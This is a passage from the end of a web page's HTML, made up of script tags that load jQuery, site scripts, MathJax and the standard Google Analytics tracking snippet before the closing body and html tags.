src="https://code.jquery.com/jquery-3.1.0.min.js"></script><script src="/js/posfixed.js"></script><script src="/js/utils.js"></script><script src="/js/search.js"></script><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-92791318-1",'auto');ga('send','pageview');</script></body></html>